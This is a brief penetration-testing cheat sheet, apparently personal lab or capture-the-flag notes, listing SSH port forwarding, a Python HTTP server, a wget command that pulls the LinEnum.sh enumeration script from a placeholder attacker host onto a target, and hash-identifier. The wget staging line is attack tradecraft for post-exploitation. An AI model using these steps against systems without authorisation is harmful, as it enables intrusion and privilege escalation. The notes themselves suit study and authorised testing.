# Useful Tools

- The command below can be used if we find a service or server running locally and we have basic user access to it to forward the port to a different port to allow access to ourselves, (Port Forwarding)

```jsx
ssh -L NEWPORT:IPADDRESS:OLDPORT username
```

- The below command is how to setup an http server on a device

```php
python3 -m http.server 8080
```

- The below command is how to grab the file in question when there is an http server setup

```php
wget http://IPofATTACK:8080/LinEnum.sh
```

- The below command can be used in conjunction with a hash to help us identify the hash in question

```jsx
hash-identifier
```